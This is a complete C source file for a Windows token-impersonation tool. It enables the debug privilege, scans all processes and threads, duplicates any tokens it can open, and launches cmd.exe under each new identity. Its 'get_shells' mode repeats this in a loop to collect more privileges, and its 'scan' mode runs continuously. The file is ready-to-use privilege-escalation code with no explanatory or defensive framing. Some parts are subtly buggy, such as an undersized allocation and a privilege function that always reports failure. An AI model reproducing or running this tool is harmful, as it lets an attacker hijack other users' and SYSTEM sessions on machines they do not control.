#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#define RUN_PROCESS L"C:\\WINDOWS\\system32\\cmd.exe"
#define SCAN_DELAY_MS 500

// gets the SeDebugPrivilege
BOOL PrivilegeEnableSeDebug() {

	BOOL bRet = FALSE;
	HANDLE hToken = NULL;
	LUID luid = { 0 };
	TOKEN_PRIVILEGES tokenPriv = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
		return FALSE;

	tokenPriv.PrivilegeCount = 1;
	tokenPriv.Privileges[0].Luid = luid;
	tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
		return FALSE;

	return bRet;
}

// redefinition of Windows structs
typedef struct _SID_IDENTIFIER_AUTHORITY_X
{
	UCHAR Value[6];
} SID_IDENTIFIER_AUTHORITY_X, *PSID_IDENTIFIER_AUTHORITY_X;
typedef struct _SID_X {
	UCHAR Revision;
	UCHAR SubAuthorityCount;
	SID_IDENTIFIER_AUTHORITY_X IdentifierAuthority;
	ULONG SubAuthority[1];									// count is SubAuthorityCount
}SID_X, *PSID_X;
typedef struct _TOKEN_USER_X {
	PSID_X Sid;
	DWORD Attributes;
}TOKEN_USER_X, *PTOKEN_USER_X;
typedef struct _KNOWN_SID {
	PVOID Flink;
	ULONG UserTokenSidSize;
	TOKEN_USER_X UserToken;
}KNOWN_SID, *PKNOWN_SID;

#define SID_DEFAULT_ALLOC_SIZE 0x200
PKNOWN_SID gKnownSids = NULL;

// initiates the known list with the current process SID
BOOL KnownSidsInitList()
{
	HANDLE hToken;
	ULONG dwSize;
	PTOKEN_USER sidData;

	if (gKnownSids != NULL)
		return TRUE;

	RevertToSelf();

	gKnownSids = (PKNOWN_SID)malloc(sizeof(KNOWN_SID));
	sidData = (PTOKEN_USER)malloc(sizeof(SID_DEFAULT_ALLOC_SIZE));

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
		printf("OpenProcessToken failed : %x\n", GetLastError());
		return FALSE;
	}

	if (!GetTokenInformation(hToken, TokenUser, sidData, SID_DEFAULT_ALLOC_SIZE, &dwSize)){
		printf("GetTokenInformation failed : %x\n", GetLastError());
		return FALSE;
	}

	gKnownSids->Flink = NULL;
	gKnownSids->UserToken.Sid = (PSID_X)sidData->User.Sid;
	gKnownSids->UserToken.Attributes = sidData->User.Attributes;
	gKnownSids->UserTokenSidSize = sizeof(SID) + sizeof(ULONG) * (gKnownSids->UserToken.Sid->SubAuthorityCount - 1);

	printf("Startup user token sid start : S-1-%d-%d\n",
		gKnownSids->UserToken.Sid->IdentifierAuthority.Value[5],
		gKnownSids->UserToken.Sid->SubAuthority[0]);

	CloseHandle(hToken);

	return TRUE;
}

// walks the known list 
BOOLEAN KnownSidsSearchSid(PTOKEN_USER UserToken, ULONG UserTokenSize) {
	ULONG CurrentSidSize = 0;
	PKNOWN_SID TokenSeenPtr = NULL;

	if (UserTokenSize == 0)
		return TRUE;

	CurrentSidSize = sizeof(SID) + sizeof(ULONG) * (((PSID_X)(UserToken->User.Sid))->SubAuthorityCount - 1);
	TokenSeenPtr = gKnownSids;
	while (TokenSeenPtr != NULL) {
		if (CurrentSidSize == TokenSeenPtr->UserTokenSidSize) {
			if (memcmp(TokenSeenPtr->UserToken.Sid, UserToken->User.Sid, CurrentSidSize) == 0)
				return TRUE;
		}
		TokenSeenPtr = (PKNOWN_SID)TokenSeenPtr->Flink;
	}

	return FALSE;
}

// adds the SID in the known list
void KnownSidsAddSid(PTOKEN_USER UserToken, ULONG UserTokenSize) {
	ULONG CurrentSidSize = 0;
	PKNOWN_SID TokenTmp = NULL;
	PKNOWN_SID TokenSeenPtr = NULL;
	PBYTE sidData;

	CurrentSidSize = sizeof(SID) + sizeof(ULONG) * (((PSID_X)(UserToken->User.Sid))->SubAuthorityCount - 1);
	sidData = (PBYTE)malloc(CurrentSidSize);
	memcpy(sidData, UserToken->User.Sid, CurrentSidSize);

	TokenTmp = (PKNOWN_SID)malloc(sizeof(KNOWN_SID));
	TokenTmp->UserTokenSidSize = CurrentSidSize;
	TokenTmp->UserToken.Attributes = UserToken->User.Attributes;
	TokenTmp->UserToken.Sid = (PSID_X)sidData;
	TokenTmp->Flink = gKnownSids;
	gKnownSids = TokenTmp;

}

// try to impersonate the thread token and runs the process if successful
BOOLEAN ThreadImpersonateAndRunExe(ULONG ThreadId) {
	HANDLE hThread, hToken;
	HANDLE DuplicatedToken;
	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	UCHAR tokenData[SID_DEFAULT_ALLOC_SIZE];
	ULONG dwSize = 0;

	hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadId);
	if (hThread == NULL)
		hThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_IMPERSONATE | THREAD_DIRECT_IMPERSONATION, FALSE, ThreadId);
	if (hThread == NULL)
		hThread = OpenThread(THREAD_IMPERSONATE | THREAD_DIRECT_IMPERSONATION, FALSE, ThreadId);
	if (hThread == NULL)
		hThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_IMPERSONATE, FALSE, ThreadId);
	if (hThread == NULL)
		hThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_DIRECT_IMPERSONATION, FALSE, ThreadId);
	if (hThread == NULL)
		return FALSE;

	if (!OpenThreadToken(hThread, TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_QUERY, FALSE, &hToken))
		if (!OpenThreadToken(hThread, TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_QUERY, TRUE, &hToken)) {
			if (GetLastError() != ERROR_NO_TOKEN) {
				//printf("OpenThreadToken failed : %x\n", GetLastError());
			}
			CloseHandle(hThread);
			return FALSE;
		}

	if (!GetTokenInformation(hToken, TokenUser, tokenData, SID_DEFAULT_ALLOC_SIZE, &dwSize)){
		printf("GetTokenInformation failed : %x\n", GetLastError());
		CloseHandle(hToken);
		CloseHandle(hThread);
		return FALSE;
	}

	if (KnownSidsSearchSid((PTOKEN_USER)tokenData, dwSize) == TRUE) {
		CloseHandle(hToken);
		CloseHandle(hThread);
		return FALSE;
	}

	if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &DuplicatedToken)) {
		printf("DuplicateTokenEx failed : %x\n", GetLastError());
		CloseHandle(hToken);
		CloseHandle(hThread);
		return FALSE;
	}
	if (!SetThreadToken(&hThread, DuplicatedToken)) {
		printf("SetThreadToken failed : %x\n", GetLastError());
		CloseHandle(hToken);
		CloseHandle(hThread);
		return FALSE;
	}

	si.cb = sizeof(si);
	if (CreateProcessWithTokenW(DuplicatedToken,
		LOGON_NETCREDENTIALS_ONLY,
		RUN_PROCESS,
		NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) == FALSE) {
		printf("CreateProcessWithTokenW failed : %x\n", GetLastError());
		CloseHandle(hToken);
		CloseHandle(hThread);
		return FALSE;
	}

	KnownSidsAddSid((PTOKEN_USER)tokenData, dwSize);
	CloseHandle(hToken);
	CloseHandle(hThread);

	return TRUE;
}


// opens the process primary token, impersonate it and run the process
BOOL ProcessImpersonateAndRunExe(int pid)
{
	HANDLE hProcess;
	HANDLE hToken;
	HANDLE hThread = GetCurrentThread();
	UCHAR tokenData[SID_DEFAULT_ALLOC_SIZE];
	HANDLE DuplicatedToken;
	STARTUPINFOW si = { 0 };
	ULONG dwSize;
	PROCESS_INFORMATION pi = { 0 };

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	if (hProcess == NULL){
		// printf("OpenProcess failed : %x\n", GetLastError());
		CloseHandle(hThread);
		return FALSE;
	}

	if (!OpenProcessToken(hProcess, TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
		//printf("OpenProcessToken failed : %x\n", GetLastError());
		CloseHandle(hProcess);
		CloseHandle(hThread);
		return FALSE;
	}

	if (!GetTokenInformation(hToken, TokenUser, tokenData, SID_DEFAULT_ALLOC_SIZE, &dwSize)){
		printf("GetTokenInformation failed : %x\n", GetLastError());
		CloseHandle(hToken);
		CloseHandle(hProcess);
		CloseHandle(hThread);
		return FALSE;
	}

	if (KnownSidsSearchSid((PTOKEN_USER)tokenData, dwSize) == TRUE) {
		CloseHandle(hToken);
		CloseHandle(hProcess);
		CloseHandle(hThread);
		return FALSE;
	}

	if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &DuplicatedToken)) {
		printf("DuplicateTokenEx failed : %x\n", GetLastError());
		CloseHandle(hToken);
		CloseHandle(hProcess);
		CloseHandle(hThread);
		return FALSE;
	}
	if (!SetThreadToken(&hThread, DuplicatedToken)) {
		printf("SetThreadToken failed : %x\n", GetLastError());
		CloseHandle(hToken);
		CloseHandle(hProcess);
		CloseHandle(hThread);
		return FALSE;
	}

	si.cb = sizeof(si);
	if (CreateProcessWithTokenW(DuplicatedToken,
		LOGON_NETCREDENTIALS_ONLY,
		RUN_PROCESS,
		NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) == FALSE) {
		printf("CreateProcessWithTokenW failed : %x\n", GetLastError());
		CloseHandle(hToken);
		CloseHandle(hProcess);
		CloseHandle(hThread);
		return FALSE;
	}

	KnownSidsAddSid((PTOKEN_USER)tokenData, dwSize);

	CloseHandle(hToken);
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return TRUE;
}

// list processes and try token impersonation on any of them
BOOLEAN ScanLocalProcesses() {
	HANDLE hSnapThread = NULL;
	PROCESSENTRY32W th32data = { 0 };
	BOOLEAN success = FALSE;
	th32data.dwSize = sizeof(th32data);

	if (!KnownSidsInitList()) {
		printf("KnownSidsInitList failed\n");
		return success;
	}

	hSnapThread = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapThread == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot failed : %x\n", GetLastError());
		return success;
	}
	if (!Process32First(hSnapThread, &th32data))  {
		printf("Thread32First failed : %x\n", GetLastError());
		return success;
	}

	do {

		if (ProcessImpersonateAndRunExe(th32data.th32ProcessID) == TRUE) {
			success = TRUE;
			printf("SUCCESS :: PROCESS :: %d\n", th32data.th32ProcessID);
		}

	} while (Process32Next(hSnapThread, &th32data));

	CloseHandle(hSnapThread);

	return success;
}

// list threads and try token impersonation on any of them
BOOLEAN ScanLocalThreads() {
	HANDLE hSnapThread = NULL;
	THREADENTRY32 th32data = { 0 };
	BOOLEAN success = FALSE;
	th32data.dwSize = sizeof(th32data);

	if (!KnownSidsInitList()) {
		printf("KnownSidsInitList failed\n");
		return success;
	}

	hSnapThread = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapThread == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot failed : %x\n", GetLastError());
		return success;
	}
	if (!Thread32First(hSnapThread, &th32data))  {
		printf("Thread32First failed : %x\n", GetLastError());
		return success;
	}

	do {

		if (ThreadImpersonateAndRunExe(th32data.th32ThreadID) == TRUE) {
			printf("SUCCESS :: THREAD :: PID %d / TID %d\n", th32data.th32OwnerProcessID, th32data.th32ThreadID);
			success = TRUE;
		}

	} while (Thread32Next(hSnapThread, &th32data));

	CloseHandle(hSnapThread);
	return success;
}


int main(int argc, char** argv) {

	BOOLEAN success = FALSE;

	if (argc == 1) {
		printf("Usage : %s <system process PID> / getsystem / scan\n"
			"<system process PID> : try on PID process only\n"
			"get_shells : try getting as user shells as we can (recursive in order to gain more privileges)\n"
			"scan : continuous scan\n", argv[0]);
		return 0;
	}

	if (!_stricmp(argv[1], "get_shells")) {

		KnownSidsInitList();

		// there is no RevertToSelf call : new tokens may help obtaining other ones !
		do {
			PrivilegeEnableSeDebug();
			success = ScanLocalProcesses();
			if (ScanLocalThreads() == TRUE)
				success = TRUE;
		} while (success == TRUE);

		return 0;
	}

	if (!_stricmp(argv[1], "scan")) {

		KnownSidsInitList();

		// in this mode, we'll just continuously scan for new tokens
		while (1 == 1) {
			ScanLocalProcesses();
			ScanLocalThreads();
			Sleep(SCAN_DELAY_MS);
		}

		return 0;
	}


	printf("Getting SeDebug privilege...\n");
	if (PrivilegeEnableSeDebug() == FALSE)
		printf("/!\\ PrivilegeEnableSeDebug failed with %x\n", GetLastError());

	printf("Trying process %d\n", atoi(argv[1]));
	if (ProcessImpersonateAndRunExe(atoi(argv[1])) == FALSE)
		printf("/!\\ ProcessImpersonateAndRunExe failed!\n");

	return 0;
}
